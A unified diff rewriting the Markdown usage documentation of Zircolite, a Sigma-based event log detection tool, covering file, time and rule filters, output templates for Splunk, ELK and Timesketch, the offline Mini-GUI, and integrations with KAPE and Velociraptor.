-- Select all events between 2021-06-02 22:40:00 and 2021-06-02 23:00:00: 
-
-	```shell
-	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json \
-		-A 2021-06-02T22:40:00 -B 2021-06-02T23:00:00
-	```
-
-- Select all events after 2021-06-01 12:00:00: 
-
-	```shell
-	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json \
-		-A 2021-06-01T12:00:00
-	```
-
-### Rule Filters
-
-Some rules can be noisy or slow on specific datasets (check [here](https://github.com/wagga40/Zircolite/tree/master/rules/README.md)), so it is possible to skip them by using the `-R` or `--rulefilter` argument. This argument can be used multiple times.
-
-To find which rules are slow on your data, run with `--profile-rules`. Zircolite will print a **Rule Performance** report at the end (rules sorted by execution time). Use that list to decide which rules to exclude with `--rulefilter`. See [Rule performance profiling](Usage.md#rule-performance-profiling) in Usage.md.
-
-The filter will apply to the rule title. To avoid unexpected side effects, **comparison is case-sensitive**. For example, if you do not want to use all MSHTA-related rules: 
+Some EVTX files are never touched by Sigma rules but are large all the same —
+`Microsoft-Windows-SystemDataArchiver%4Diagnostic.evtx` is the classic example. Skipping
+them up front avoids opening and decoding them at all. Four options do it: `--select`,
+`--avoid`, `--file-pattern` and `--no-recursion` (see
+[Input files and filtering](Usage.md#input-files-and-filtering) for the exact semantics).
 
 ```shell
-python3 zircolite.py --evtx logs/ \
-	--ruleset rules/rules_windows_merged.json \
-	-R MSHTA
+# Only Sysmon logs
+python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json --select sysmon
+
+# Everything except the diagnostic archive
+python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json --avoid systemdataarchiver
+
+# Operational logs, but not Defender's
+python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json --select operational --avoid defender
+
+# A glob instead
+python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json --file-pattern "Security*.evtx"
 ```
 
-### Limit the Number of Detected Events
+> [!IMPORTANT]
+> Both match the **filename only**, never the directory path. `--select HOST01` will not
+> select `logs/HOST01/Security.evtx`, and `--avoid HOST02` will not exclude
+> `logs/HOST02/` — it silently excludes nothing. Use `--file-pattern`, or point `--events`
+> at the directory you actually want.
 
-Sometimes SIGMA rules can be very noisy (and generate a lot of false positives), but you still want to keep them in your rulesets. It is possible to filter rules that return too many detected events with the option `--limit <MAX_NUMBER>`. **Please note that when using this option, the rules are not skipped—the results are just ignored.** However, this is useful when forwarding events to Splunk.
+You no longer need these to gain the channel-level speedup —
+[early event filtering](#early-event-filtering) derives that from the ruleset, per EventID
+as well. File filters still earn their keep by skipping a file *before it is opened*,
+which the event filter cannot do, and they are the only file-level reduction available for
+Linux and auditd input.
+
+### Time filters
+
+`--after` / `-A` and `--before` / `-B` restrict processing to a time range. Both bounds
+are inclusive and can be used independently.
+
+```shell
+python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json \
+    -A 2021-06-02T22:40:00 -B 2021-06-02T23:00:00
+```
+
+- The value must be `YYYY-MM-DDTHH:MM:SS`, 24-hour.
+- The filter reads the field named by `--timefield` (`SystemTime` by default), falling
+  back to the auto-detected timestamp field when that one is absent.
+- Event timestamps are compared as instants, so epoch seconds or milliseconds, a trailing
+  `Z`, an explicit UTC offset and a space instead of `T` are all understood.
+
+### Rule filters
+
+Some rules are noisy or slow on a particular dataset. `-R` / `--rulefilter` skips them by
+title; repeat it for more. Comparison is **case-sensitive**, to avoid surprises:
+
+```shell
+python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json -R MSHTA
+```
+
+To find out which rules are slow on *your* data, run with `--profile-rules` and read the
+Rule Performance report — see
+[Usage → Rule performance profiling](Usage.md#rule-performance-profiling).
+
+### Limiting noisy rules
+
+`--limit <N>` discards the results of any rule matching more than N events. The rule still
+runs; only its output is dropped, which is what you want when forwarding to Splunk. The
+count is **per input database** — per file by default, across the whole corpus only with
+`--unified-db`. Use `-1` to disable.
 
 ## Templating and Formatting
 
-Zircolite provides a templating system based on Jinja2. It allows you to change the output format to suit your needs (Splunk or ELK integration, grep-able output, etc.). There are some templates available in the [Templates directory](https://github.com/wagga40/Zircolite/tree/master/templates) of the repository: Splunk, Timesketch, and more. To use the template system, use these arguments:
-
-- `--template <template_filename>`
-- `--templateOutput <output_filename>`
-- `--template-append`
-
-For Timesketch you can use the shortcut `--timesketch`: it uses `exportForTimesketch.tmpl` and writes to a file named `timesketch-<RAND>.json` (4-character random suffix) so you can run multiple exports without overwriting.
+Output can be reshaped with Jinja2 templates, for Splunk, ELK, Timesketch and others:
 
 ```shell
-python3 zircolite.py --evtx sample.evtx  --ruleset rules/rules_windows_merged.json \
---template templates/exportForSplunk.tmpl --templateOutput exportForSplunk.json
+python3 zircolite.py --evtx sample.evtx --ruleset rules/rules_windows_merged.json \
+    --template templates/exportForSplunk.tmpl --templateOutput exportForSplunk.json
 ```
 
-Timesketch shortcut:
+Pair one `--templateOutput` with each `--template` to write several at once. Two shortcuts
+save the typing:
 
 ```shell
 python3 zircolite.py --evtx sample.evtx --ruleset rules/rules_windows_merged.json --timesketch
+python3 zircolite.py --evtx sample.evtx --ruleset rules/rules_windows_merged.json --navigator-output
 ```
 
-For ATT&CK Navigator use `--navigator-output` (writes to `navigator-<RAND>.json`) or `--navigator-output mylayer.json` for a custom filename.
+`--timesketch` writes `timesketch-<RAND>.json`; `--navigator-output` writes
+`navigator-<RAND>.json`, or a name you give it. The random suffix means repeated exports
+do not overwrite each other.
 
-It is possible to use multiple templates if you provide a `--templateOutput` argument for each `--template` argument.
+### Available templates
+
+| Template | Output | Use case |
+|----------|--------|----------|
+| `exportForSplunk.tmpl` | NDJSON | Splunk HEC or bulk import |
+| `exportForSplunkWithRuleID.tmpl` | NDJSON | Splunk, with the rule ID for correlation |
+| `exportForELK.tmpl` | NDJSON | Elasticsearch / ELK |
+| `exportForZinc.tmpl` | Bulk JSON | OpenSearch/Elasticsearch bulk API |
+| `exportForTimesketch.tmpl` | NDJSON | Timesketch; shortcut `--timesketch` |
+| `exportForZircoGui.tmpl` | JavaScript | Mini-GUI `data.js`, used by `--package` |
+| `exportNDJSON.tmpl` | NDJSON | Generic: rule metadata plus event fields |
+| `exportSummaryCSV.tmpl` | CSV | One row per rule, for triage |
+| `exportForSARIF.tmpl` | JSON | [SARIF](https://sarifweb.azurewebsites.net/), for CI pipelines |
+| `exportForAttackNavigator.tmpl` | JSON | [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) layer; shortcut `--navigator-output` |
 
 ### Append mode
 
-By default, template output files are overwritten on every run so that re-running Zircolite over the same logs is idempotent. If you instead want to accumulate template output across multiple runs (for example, building a cumulative NDJSON feed for Splunk or ELK ingestion), pass `--template-append`:
+Template output is overwritten on every run, so re-running over the same logs is
+idempotent. `--template-append` accumulates instead, which is how you build a cumulative
+feed:
 
 ```shell
 python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json \
     --template templates/exportForSplunk.tmpl --templateOutput exportForSplunk.ndjson \
     --template-append
 ```
-
-The same setting can be expressed in YAML:
 
 ```yaml
 output:
@@ -941,76 +635,58 @@ output:
 ```
 
 > [!WARNING]
-> Append mode is intended for **line-oriented** templates such as `exportForSplunk.tmpl`, `exportForELK.tmpl`, `exportForTimesketch.tmpl`, and `exportNDJSON.tmpl`. It is not appropriate for templates that produce a **single JSON document**, such as `exportForAttackNavigator.tmpl` or `exportForSARIF.tmpl` — appending to those will produce invalid output.
-
-### Available templates
-
-| Template | Output format | Use case |
-|----------|----------------|----------|
-| `exportForSplunk.tmpl` | NDJSON | Splunk HEC or bulk import (no rule ID) |
-| `exportForSplunkWithRuleID.tmpl` | NDJSON | Splunk with rule ID for correlation |
-| `exportForELK.tmpl` | NDJSON | Elasticsearch / ELK Stack |
-| `exportForZinc.tmpl` | Bulk JSON | OpenSearch/Elasticsearch bulk API (index + document per event) |
-| `exportForTimesketch.tmpl` | NDJSON | Timesketch (uses `--timefield` for datetime); shortcut: `--timesketch` |
-| `exportForZircoGui.tmpl` | JavaScript | Mini-GUI `data.js` (used by `--package`) |
-| `exportNDJSON.tmpl` | NDJSON | Generic: rule metadata + event fields, one JSON per line |
-| `exportSummaryCSV.tmpl` | CSV | One row per rule (triage/summary), not per event |
-| `exportForSARIF.tmpl` | JSON | [SARIF](https://sarifweb.azurewebsites.net/) format for integration with code analysis tools and CI pipelines |
-| `exportForAttackNavigator.tmpl` | JSON | [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) layer with technique scores and colors; shortcut: `--navigator-output` |
+> Append mode only suits **line-oriented** templates — everything in the table above that
+> emits NDJSON or bulk JSON. The two that emit a **single JSON document**,
+> `exportForAttackNavigator.tmpl` and `exportForSARIF.tmpl`, become invalid when a second
+> document is concatenated onto the first.
 
 ## Mini-GUI
 
-![](../pics/gui.webp)
+![](pics/gui.jpg)
 
-
-The Mini-GUI can be used completely offline. It allows the user to display and search results. It uses [DataTables](https://datatables.net/) and the [SB Admin 2 theme](https://github.com/StartBootstrap/startbootstrap-sb-admin-2). 
-
-### Automatic Generation
-
-The easiest way to use the Mini-GUI is to generate a package with the `--package` option. A ZIP file containing all the necessary data will be generated. Use `--package-dir` to specify the output directory:
+The Mini-GUI displays and searches results, entirely offline. It is built on
+[DataTables](https://datatables.net/) and the
+[SB Admin 2 theme](https://github.com/StartBootstrap/startbootstrap-sb-admin-2).
 
 ```shell
-python3 zircolite.py --evtx sample.evtx \
-    --ruleset rules/rules_windows_merged.json \
+python3 zircolite.py --evtx sample.evtx --ruleset rules/rules_windows_merged.json \
     --package --package-dir /path/to/output
 ```
 
-`--package` needs `gui/zircogui.zip`. Zircolite looks for it beside the
-executable first, then inside the binary itself — the standalone binaries carry
-a copy, so `--package` works with nothing on disk but the executable. Dropping
-an updated `gui/zircogui.zip` next to the binary replaces the built-in Mini-GUI
-without a rebuild.
+`--package` produces a ZIP holding everything needed. Two things to know: a run with no
+detections skips package creation and says so, and `--package-dir` must point at a
+directory that already exists — Zircolite reports an error rather than writing the package
+somewhere you would not think to look.
 
-### Manual Generation
+It needs `gui/zircogui.zip`, which Zircolite looks for beside the executable first and
+then inside the binary itself — the standalone binaries carry a copy, so `--package` works
+with nothing on disk but the executable. Dropping an updated `gui/zircogui.zip` next to
+the binary replaces the built-in Mini-GUI without a rebuild.
 
-You need to generate a `data.js` file with the `exportForZircoGui.tmpl` template, decompress the `zircogui.zip` file in the [gui](https://github.com/wagga40/Zircolite/tree/master/gui/) directory, and replace the `data.js` file in it with yours:
+To build it by hand instead, render `data.js` and drop it into the unpacked archive:
 
 ```shell
-python3 zircolite.py --evtx sample.evtx 
-	--ruleset rules/rules_windows_merged.json \
-	--template templates/exportForZircoGui.tmpl --templateOutput data.js
+python3 zircolite.py --evtx sample.evtx --ruleset rules/rules_windows_merged.json \
+    --template templates/exportForZircoGui.tmpl --templateOutput data.js
 7z x gui/zircogui.zip
 mv data.js zircogui/
 ```
 
-Then simply open `index.html` in your favorite browser and click on a MITRE ATT&CK® category or an alert level.
-  
-> [!WARNING]  
-> **The Mini-GUI was not built to handle large datasets.**
+Then open `index.html` and click a MITRE ATT&CK category or an alert level.
 
-## Troubleshooting
+> [!WARNING]
+> The Mini-GUI was not built to handle large datasets.
 
-### Debug Mode
+## Other Tools
 
-Use `--debug` for detailed logging:
+The repository ships a few scripts of its own in `tools/`, documented in
+[`tools/README.md`](https://github.com/wagga40/Zircolite/tree/master/tools):
+`sigma-regression.py` runs the SigmaHQ regression suite against a ruleset, and the
+benchmark scripts measure flattening and database performance.
 
-```shell
-python3 zircolite.py --evtx sample.evtx --ruleset rules.json --debug
-```
+Zircolite is also driven by third-party tooling:
 
-## Other Tools 
-
-Some other tools (mostly untested) have included a way to run Zircolite: 
-
-- [KAPE](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape) has a module for Zircolite: [here](https://github.com/EricZimmerman/KapeFiles/tree/master/Modules/Apps/GitHub)
-- [Velociraptor](https://github.com/Velocidex/velociraptor) has an artifact for Zircolite: [here](https://docs.velociraptor.app/exchange/artifacts/pages/windows.eventlogs.zircolite/)
+- [KAPE](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape)
+  has a [module](https://github.com/EricZimmerman/KapeFiles/tree/master/Modules/Apps/GitHub).
+- [Velociraptor](https://github.com/Velocidex/velociraptor) has an
+  [artifact](https://docs.velociraptor.app/exchange/artifacts/pages/windows.eventlogs.zircolite/).
